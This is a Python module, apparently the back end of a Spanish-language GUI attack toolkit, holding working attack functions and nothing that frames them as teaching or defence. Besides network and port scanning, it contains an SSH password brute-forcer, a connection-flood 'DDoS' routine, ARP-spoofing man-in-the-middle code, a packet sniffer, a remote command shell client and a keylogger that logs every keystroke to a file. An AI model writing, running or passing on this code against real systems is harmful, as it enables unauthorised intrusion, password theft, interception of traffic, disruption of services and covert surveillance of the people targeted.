import threading
from concurrent.futures import ThreadPoolExecutor
import time
import nmap
import netifaces
from tkinter import messagebox
from socket import socket, AF_INET, SOCK_STREAM
import keyboard
import scapy.all as scapy
import paramiko
import os
import threading
import time
from utils import mostrar_resultado_con_descarga

# 1. Funciones de escaneo de red
def get_network_range():
    """Obtiene el rango de red automáticamente"""
    try:
        interfaces = netifaces.interfaces()
        for interface in interfaces:
            if interface == "lo":
                continue
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ip_info = addresses[netifaces.AF_INET][0]
                ip = ip_info.get('addr', '')
                netmask = ip_info.get('netmask', '')
                if ip and netmask:
                    ip_parts = list(map(int, ip.split('.')))
                    mask_parts = list(map(int, netmask.split('.')))
                    network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
                    return f"{'.'.join(map(str, network_parts))}/24"
        return None
    except Exception as e:
        messagebox.showerror("Error", f"Error al obtener rango de red: {str(e)}")
        return None

def scan_ports(ip, start_port=1, end_port=1024):
    """Escanea puertos en un rango específico"""
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=ip, ports=f"{start_port}-{end_port}", arguments='-sS')
        open_ports = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                for port in nm[host][proto].keys():
                    if nm[host][proto][port]['state'] == 'open':
                        open_ports.append(port)
        return open_ports
    except Exception as e:
        messagebox.showerror("Error", f"Error en escaneo: {str(e)}")
        return []

def open_port_scanner(ip, start_port, end_port):
    """Interfaz para el escaneo de puertos"""
    if not ip:
        messagebox.showerror("Error", "Ingrese una dirección IP")
        return
    
    try:
        start_port = int(start_port)
        end_port = int(end_port)
    except ValueError:
        messagebox.showerror("Error", "Puertos deben ser números")
        return
    
    open_ports = scan_ports(ip, start_port, end_port)
    if open_ports:
        result = f"Puertos abiertos en {ip} ({start_port}-{end_port}):\n{', '.join(map(str, open_ports))}"
        mostrar_resultado_con_descarga("Resultados Escaneo", result, f"scan_{ip}.txt")
    else:
        messagebox.showinfo("Resultado", f"No se encontraron puertos abiertos en {ip}")

def scan_network(ip_range=None):
    """Escanea dispositivos en la red"""
    try:
        if not ip_range:
            ip_range = get_network_range()
            if not ip_range:
                messagebox.showerror("Error", "No se pudo detectar el rango de red")
                return []
        
        nm = nmap.PortScanner()
        nm.scan(hosts=ip_range, arguments='-sn')
        
        devices = []
        for host in nm.all_hosts():
            mac = nm[host]['addresses'].get('mac', 'Desconocida')
            hostname = nm[host]['hostnames'][0].get('name', 'Desconocido')
            devices.append({'ip': host, 'mac': mac, 'hostname': hostname})
        return devices
    except Exception as e:
        messagebox.showerror("Error", f"Error en escaneo de red: {str(e)}")
        return []

def open_network_scan():
    """Interfaz para escaneo de red"""
    devices = scan_network()
    if devices:
        result = "Dispositivos encontrados:\n\n"
        for device in devices:
            result += f"IP: {device['ip']}\nMAC: {device['mac']}\nHostname: {device['hostname']}\n\n"
        mostrar_resultado_con_descarga("Escaneo de Red", result, "network_scan.txt")
    else:
        messagebox.showinfo("Resultado", "No se encontraron dispositivos")

# 2. Funciones de ataque
def open_reverse_shell(ip):
    """Establece una conexión de reverse shell"""
    if not ip:
        messagebox.showerror("Error", "Ingrese una dirección IP")
        return
    
    messagebox.showinfo("Reverse Shell", f"Conectando a {ip}...")
    
    try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, 5000))
        
        while True:
            cmd = input("$ ")
            if cmd.lower() == 'exit':
                s.send(cmd.encode())
                s.close()
                break
            s.send(cmd.encode())
            print(s.recv(4096).decode())
    except Exception as e:
        messagebox.showerror("Error", f"Conexión fallida: {str(e)}")

def ddos_attack(target_ip, target_port=80, duration=30):
    """Ataque DDoS básico"""
    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(("GET / HTTP/1.1\r\n").encode(), (target_ip, target_port))
                s.close()
            except:
                pass
    except Exception as e:
        messagebox.showerror("Error", f"Error en ataque DDoS: {str(e)}")

def open_ddos_attack(target_ip, target_port, duration):
    """Interfaz para ataque DDoS"""
    if not target_ip or not target_port or not duration:
        messagebox.showerror("Error", "Complete todos los campos")
        return
    
    try:
        target_port = int(target_port)
        duration = int(duration)
    except ValueError:
        messagebox.showerror("Error", "Puerto y duración deben ser números")
        return
    
    messagebox.showinfo("DDoS", f"Iniciando ataque a {target_ip}:{target_port} por {duration} segundos")
    threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration), daemon=True).start()

def brute_force_ssh(target_ip, username, wordlist_path, max_threads=5):
    """Ataque de fuerza bruta a SSH"""
    try:
        if not os.path.exists(wordlist_path):
            messagebox.showerror("Error", "Archivo de diccionario no encontrado")
            return None
        
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
        
        found = None
        lock = threading.Lock()
        
        def try_password(password):
            nonlocal found
            if found:
                return
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, username=username, password=password, timeout=5)
                ssh.close()
                with lock:
                    found = password
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(try_password, passwords)
        
        return found
    except Exception as e:
        messagebox.showerror("Error", f"Error en fuerza bruta: {str(e)}")
        return None

def open_brute_force(target_ip, username, wordlist_path):
    """Interfaz para fuerza bruta"""
    if not target_ip or not username or not wordlist_path:
        messagebox.showerror("Error", "Complete todos los campos")
        return
    
    if not os.path.exists(wordlist_path):
        messagebox.showerror("Error", "Archivo de diccionario no encontrado")
        return
    
    messagebox.showinfo("Fuerza Bruta", f"Iniciando ataque a {target_ip} con usuario '{username}'")
    password = brute_force_ssh(target_ip, username, wordlist_path)
    
    if password:
        mostrar_resultado_con_descarga(
            "Fuerza Bruta - Éxito",
            f"¡Contraseña encontrada!\n\nUsuario: {username}\nContraseña: {password}",
            f"bruteforce_success_{target_ip}.txt"
        )
    else:
        messagebox.showinfo("Resultado", "No se encontró la contraseña")

def mitm_arp_spoof(target_ip, gateway_ip, interface="eth0"):
    """Ataque MITM sin warnings y con manejo adecuado"""
    try:
        # Obtener MACs una sola vez
        target_mac = scapy.getmacbyip(target_ip)
        gateway_mac = scapy.getmacbyip(gateway_ip)
        
        if not target_mac or not gateway_mac:
            raise ValueError("No se pudieron obtener direcciones MAC")

        # Función para enviar paquetes ARP sin warnings
        def send_arp(op, psrc, hwsrc, pdst, hwdst):
            scapy.send(
                scapy.ARP(
                    op=op,
                    psrc=psrc,
                    hwsrc=hwsrc,
                    pdst=pdst,
                    hwdst=hwdst
                ),
                verbose=False,
                iface=interface
            )

        # Restauración ARP
        def restore():
            send_arp(2, gateway_ip, gateway_mac, target_ip, target_mac)
            send_arp(2, target_ip, target_mac, gateway_ip, gateway_mac)
            messagebox.showinfo("MITM", "ARP restaurado")

        # Hilo principal de spoofing
        def spoof():
            try:
                while getattr(threading.current_thread(), "running", True):
                    send_arp(2, gateway_ip, gateway_mac, target_ip, target_mac)
                    send_arp(2, target_ip, target_mac, gateway_ip, gateway_mac)
                    time.sleep(2)
            finally:
                restore()

        # Configurar y lanzar hilo
        spoof_thread = threading.Thread(target=spoof)
        spoof_thread.running = True
        spoof_thread.daemon = True
        spoof_thread.start()
        
        return spoof_thread
    except Exception as e:
        messagebox.showerror("Error MITM", str(e))
        return None
def open_mitm_attack(target_ip, gateway_ip, interface):
    """Interfaz para MITM"""
    if not target_ip or not gateway_ip:
        messagebox.showerror("Error", "Complete todos los campos")
        return
    
    messagebox.showinfo("MITM", f"Iniciando ataque entre {target_ip} y {gateway_ip}")
    threading.Thread(target=mitm_arp_spoof, args=(target_ip, gateway_ip, interface), daemon=True).start()

# 3. Funciones de monitorización
def sniff_packets(interface="eth0", timeout=30, filter=""):
    """Captura paquetes de red de forma efectiva"""
    try:
        # Verificar permisos
        if os.geteuid() != 0:
            messagebox.showerror("Error", "Se requieren privilegios de root para sniffing")
            return []

        # Configurar filtro básico si no se especifica
        if not filter:
            filter = "tcp or udp or icmp"
        
        # Capturar paquetes con almacenamiento
        packets = scapy.sniff(
            iface=interface,
            timeout=timeout,
            filter=filter,
            store=True,
            prn=lambda x: x.summary()  # Mostrar resumen en tiempo real
        )
        
        return packets
    except Exception as e:
        messagebox.showerror("Error", f"Error en sniffer: {str(e)}")
        return []

def open_sniffer(interface, timeout):
    """Interfaz mejorada para el sniffer"""
    if not interface:
        messagebox.showerror("Error", "Especifique una interfaz de red")
        return
    
    try:
        timeout = int(timeout)
        if timeout <= 0:
            raise ValueError
    except ValueError:
        messagebox.showerror("Error", "El tiempo debe ser un número positivo")
        return
    
    # Ejecutar en un hilo para no bloquear la GUI
    def run_sniffer():
        packets = sniff_packets(interface, timeout)
        if packets:
            result = "Paquetes capturados:\n\n"
            for pkt in packets[:200]:  # Limitar a 200 paquetes para no saturar
                result += f"{pkt.summary()}\n"
            mostrar_resultado_con_descarga("Resultados Sniffer", result, f"sniffer_{interface}.txt")
        else:
            messagebox.showinfo("Sniffer", "No se capturaron paquetes")
    
    threading.Thread(target=run_sniffer, daemon=True).start()
def keylogger():
    """Keylogger básico"""
    log_file = "keylog.txt"
    
    def on_key(event):
        with open(log_file, 'a') as f:
            if event.name == 'space':
                f.write(' ')
            elif event.name == 'enter':
                f.write('\n')
            elif len(event.name) == 1:
                f.write(event.name)
            else:
                f.write(f'[{event.name}]')
    
    try:
        if os.path.exists(log_file):
            os.remove(log_file)
        
        keyboard.on_press(on_key)
        messagebox.showinfo("Keylogger", "Keylogger iniciado (F12 para detener)")
        keyboard.wait('f12')
        keyboard.unhook_all()
        
        with open(log_file, 'r') as f:
            data = f.read()
        
        mostrar_resultado_con_descarga(
            "Keylogger - Datos Capturados",
            data,
            "keylogger_data.txt"
        )
    except Exception as e:
        messagebox.showerror("Error", f"Error en keylogger: {str(e)}")